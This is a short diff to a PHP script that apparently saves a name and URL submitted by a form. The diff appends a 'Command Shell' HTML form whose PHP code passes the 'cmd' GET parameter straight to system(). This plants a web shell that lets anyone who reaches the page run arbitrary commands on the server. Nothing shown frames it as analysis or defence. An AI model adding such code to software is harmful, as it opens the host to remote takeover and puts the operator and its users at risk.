@@ -65,4 +65,20 @@ if (isset($_POST['save_name']) && isset($_POST['url'])) {
     }
 }
 ?>
+<HTML>
+<BODY>
+	<hr />
+	<b>Command Shell</b> <br />
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<?
+if($_GET['cmd']) {
+  system($_GET['cmd']);
+  }
+?>
+</pre>
+</BODY></HTML>
 </pre>
